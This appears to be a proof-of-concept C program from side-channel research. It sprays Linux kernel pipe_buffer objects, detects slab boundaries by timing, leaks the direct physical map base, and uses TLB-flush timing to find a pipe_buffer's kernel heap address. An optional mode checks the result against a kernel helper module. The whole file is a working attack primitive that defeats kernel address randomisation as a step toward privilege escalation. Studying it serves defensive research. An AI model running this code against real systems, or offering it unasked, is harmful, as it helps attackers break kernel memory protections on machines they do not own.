#include "utils.h"
#include "cacheutils.h"
#include "tlb_flush.h"
#include "pipe_buffer.h"
#include "coarse_grain_leak.h"
#define VALIDATE
#ifdef VALIDATE
#include "ulkm.h"
#endif
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/mman.h>
#define IPPROTO_DCCP 33
#define IPPROTO_SCTP 132
#define IPPROTO_L2TP 115
#define CAN_RAW 1
#define CAN_BCM 2
#define CAN_ISOTP 6

#define OBJS_PER_SLAB 42
// #define PIPE_BUFFER_SPRAY (OBJS_PER_SLAB*200)
#define PIPE_BUFFER_SPRAY (OBJS_PER_SLAB*100)
#define PIPE_BUFFER (OBJS_PER_SLAB*10)

#define TRIES 40

#define PIPE_SIZE 40
#define PIPE_CNT 16
int pipes_spray[PIPE_BUFFER_SPRAY][2];
int pipes[PIPE_BUFFER][2];
char buffer[0x1000];

void get_times(int fd, size_t addr, size_t tries, size_t *time, size_t *time_n2, size_t *time_n4)
{
    size_t times[tries];
    size_t times_n2[tries];
    size_t times_n4[tries];
    for (size_t i = 0; i < tries; ++i) {
        flush_tlb_targeted_4k(addr);
        flush_tlb_targeted_4k(addr+2*(1<<12));
        flush_tlb_targeted_4k(addr+4*(1<<12));
        __attribute__((unused))int __ret = read(fd, (void *)0xdeadbeef000, 8);
        times[i] = onlyreload(addr);
        times_n2[i] = onlyreload(addr+2*(1<<12));
        times_n4[i] = onlyreload(addr+4*(1<<12));
    }
    qsort(times, tries, sizeof(size_t), comp);
    qsort(times_n2, tries, sizeof(size_t), comp);
    qsort(times_n4, tries, sizeof(size_t), comp);
    *time = times[tries/4];
    *time_n2 = times_n2[tries/4];
    *time_n4 = times_n4[tries/4];
}
int is_2mb(int fd, size_t addr, size_t tries)
{
    size_t time;
    size_t time_n2;
    size_t time_n4;
    get_times(fd, addr, tries, &time, &time_n2, &time_n4);
    return (time < THRESHOLD && time_n2 < THRESHOLD && time_n4 < THRESHOLD);
}
int hit_flush(int fd, size_t addr, size_t tries)
{
    size_t time;
    size_t time_n2;
    size_t time_n4;
    get_times(fd, addr, tries, &time, &time_n2, &time_n4);
    return (time < THRESHOLD && (time_n2 > THRESHOLD || time_n4 > THRESHOLD));
}

int main(void)
{
    printf("[*] start\n");
    set_limit();
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    pin_to_core(0);

    init_tlb_flush();
    get_total_memory();

    size_t time;
    size_t prev_time = -1;
    size_t last_slab = -1;
    for (size_t i = 0; i < PIPE_BUFFER_SPRAY/2; ++i) {
        alloc_pipes(pipes_spray[i], O_NONBLOCK);
        resize_pipe(pipes_spray[i][0], 2);
        write_pipe(pipes_spray[i][1], buffer, 8);
    }

    printf("[*] load 1st half of kernel modules\n");
    int sock_fd;
    sock_fd = socket(AF_INET, SOCK_DCCP, IPPROTO_DCCP);
    if (sock_fd < 0) {
        perror("socket(AF_INET, SOCK_DCCP, IPPROTO_DCCP)");
        exit(-1);
    }
    sock_fd = socket(SOCK_DGRAM, CAN_BCM, 0);
    if (sock_fd < 0) {
        perror("socket(SOCK_DGRAM, CAN_BCM, 0)");
        exit(-1);
    }
    sock_fd = socket(AF_VSOCK, SOCK_STREAM, 0);
    if (sock_fd < 0) {
        perror("socket(AF_VSOCK, SOCK_STREAM, 0)");
        exit(-1);
    }

    for (size_t i = PIPE_BUFFER_SPRAY/2; i < PIPE_BUFFER_SPRAY; ++i) {
        alloc_pipes(pipes_spray[i], O_NONBLOCK);
        size_t t0 = rdtsc_begin();
        resize_pipe(pipes_spray[i][0], 2);
        size_t t1 = rdtsc_end();
        write_pipe(pipes_spray[i][1], buffer, 8);
        time = t1-t0;
        if (time > (prev_time+1000)) {
            if (last_slab == (size_t)-1)
                last_slab = i;
            else if (i - last_slab == OBJS_PER_SLAB)
                break;
            else 
                last_slab = -1;
        }
        prev_time = time;
    }
    for (size_t i = 0; i < PIPE_BUFFER; ++i) {
        alloc_pipes(pipes[i], O_NONBLOCK);
        resize_pipe(pipes[i][0], 2);
        write_pipe(pipes[i][1], buffer, 8);
    }

    printf("[*] load 2nd half of kernel modules\n");
    sock_fd = socket(AF_CAN, SOCK_DGRAM, CAN_ISOTP);
    if (sock_fd < 0) {
        perror("socket(AF_CAN, SOCK_DGRAM, CAN_ISOTP");
        exit(-1);
    }
    sock_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP);
    if (sock_fd < 0) {
        perror("socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP)");
        exit(-1);
    }
    sock_fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_L2TP);
    if (sock_fd < 0) {
        perror("socket(PF_INET, SOCK_STREAM, IPPROTO_L2TP)");
        exit(-1);
    }

    __attribute__((unused))size_t found_addresses[32];
    __attribute__((unused))size_t found_addresses_index = 0;

#ifdef VALIDATE
    lkm_init();
    size_t pipe_buffer_0;
    size_t pipe_buffer_1;
    size_t pipe_buffer_2;
    size_t pipe_buffer_3;
    size_t pipe_buffer_4;
    size_t pipe_buffer_21;
    size_t pipe_buffer_40;
    size_t pipe_buffer_ns1;
    size_t pipe_buffer_ns2;
    size_t pipe_buffer_ns3;
    size_t pipe_buffer_ns4;
    size_t pipe_buffer_ns5;
    lkm_pipe_buffer_leak((size_t)&pipe_buffer_0, pipes[0][0], 1);
    printf("[*] pipe_buffer 0 %016zx\n", pipe_buffer_0);
    lkm_pipe_buffer_leak((size_t)&pipe_buffer_1, pipes[1][0], 1);
    printf("[*] pipe_buffer 1 %016zx\n", pipe_buffer_1);
    lkm_pipe_buffer_leak((size_t)&pipe_buffer_2, pipes[2][0], 1);
    printf("[*] pipe_buffer 2 %016zx\n", pipe_buffer_2);
    lkm_pipe_buffer_leak((size_t)&pipe_buffer_3, pipes[3][0], 1);
    printf("[*] pipe_buffer 3 %016zx\n", pipe_buffer_3);
    lkm_pipe_buffer_leak((size_t)&pipe_buffer_4, pipes[4][0], 1);
    printf("[*] pipe_buffer 4 %016zx\n", pipe_buffer_4);
    lkm_pipe_buffer_leak((size_t)&pipe_buffer_21, pipes[21][0], 1);
    printf("[*] pipe_buffer 21 %016zx\n", pipe_buffer_21);
    lkm_pipe_buffer_leak((size_t)&pipe_buffer_40, pipes[40][0], 1);
    printf("[*] pipe_buffer 40 %016zx\n", pipe_buffer_40);
    lkm_pipe_buffer_leak((size_t)&pipe_buffer_ns1, pipes[OBJS_PER_SLAB][0], 1);
    printf("[*] pipe_buffer %d %016zx\n", OBJS_PER_SLAB, pipe_buffer_ns1);
    lkm_pipe_buffer_leak((size_t)&pipe_buffer_ns2, pipes[OBJS_PER_SLAB*2][0], 1);
    printf("[*] pipe_buffer %d %016zx\n", OBJS_PER_SLAB*2, pipe_buffer_ns2);
    lkm_pipe_buffer_leak((size_t)&pipe_buffer_ns3, pipes[OBJS_PER_SLAB*3][0], 1);
    printf("[*] pipe_buffer %d %016zx\n", OBJS_PER_SLAB*3, pipe_buffer_ns3);
    lkm_pipe_buffer_leak((size_t)&pipe_buffer_ns4, pipes[OBJS_PER_SLAB*4][0], 1);
    printf("[*] pipe_buffer %d %016zx\n", OBJS_PER_SLAB*4, pipe_buffer_ns4);
    lkm_pipe_buffer_leak((size_t)&pipe_buffer_ns5, pipes[OBJS_PER_SLAB*5][0], 1);
    printf("[*] pipe_buffer %d %016zx\n", OBJS_PER_SLAB*5, pipe_buffer_ns5);

    size_t is_4kb = lkm_is_4kb(pipe_buffer_0);
    printf("[*] %016zx is %s page\n", pipe_buffer_0, is_4kb ? "4kB" : "2MB");
#endif

    size_t dpm_base = dpm_leak(TRIES);
    printf("[*] dpm_base: %016zx\n", dpm_base);
    for (size_t addr = dpm_base; addr < dpm_base+mem_total_rounded; addr += (1<<21)) {
        if ((addr % (1 << 30)) == 0)
            printf("[*] addr %016zx\n", addr);

        if (is_2mb(pipes[0][0], addr, 40))
            continue;
        for (size_t i = 0; i < (1ULL << 21); i += (1ULL << 12)) {
            size_t cur_addr = addr + i;
            size_t found_0 = hit_flush(pipes[0][0], cur_addr, TRIES);
            if (!found_0)
                continue;

            size_t found_ns1 = hit_flush(pipes[OBJS_PER_SLAB][0], cur_addr, TRIES);
            if (found_ns1)
                continue;
            size_t found_ns2 = hit_flush(pipes[OBJS_PER_SLAB*2][0], cur_addr, TRIES);
            if (found_ns2)
                continue;
            size_t found_ns3 = hit_flush(pipes[OBJS_PER_SLAB*3][0], cur_addr, TRIES);
            if (found_ns3)
                continue;
            size_t found_ns4 = hit_flush(pipes[OBJS_PER_SLAB*4][0], cur_addr, TRIES);
            if (found_ns4)
                continue;
            size_t found_ns5 = hit_flush(pipes[OBJS_PER_SLAB*5][0], cur_addr, TRIES);
            if (found_ns5)
                continue;

            size_t found_1 = hit_flush(pipes[1][0], cur_addr, TRIES);
            if (!found_1)
                continue;
            size_t found_2 = hit_flush(pipes[2][0], cur_addr, TRIES);
            if (!found_2)
                continue;
            size_t found_3 = hit_flush(pipes[3][0], cur_addr, TRIES);
            if (!found_3)
                continue;
            size_t found_21 = hit_flush(pipes[21][0], cur_addr, TRIES);
            if (!found_21)
                continue;
            size_t found_40 = hit_flush(pipes[40][0], cur_addr, TRIES);
            if (!found_40)
                continue;
            size_t found_39 = hit_flush(pipes[39][0], cur_addr, TRIES);
            if (!found_39)
                continue;
            
            found_addresses[found_addresses_index++] = cur_addr;
            printf("[+] found addr %016zx\n", cur_addr);
        }
    }

    if (found_addresses_index == 0)
        printf("[*] non found -> retry\n");
    else if (found_addresses_index != 1)
        printf("[*] multiple addresses -> retry\n");
#ifdef VALIDATE
    else if (found_addresses[0] == (pipe_buffer_0 & ~((1<<12)-1)))
        printf("[+] success\n");
    else
        printf("[!] fail\n");
#else
    else
        printf("[*] found %016zx\n", found_addresses[0]);
#endif
}
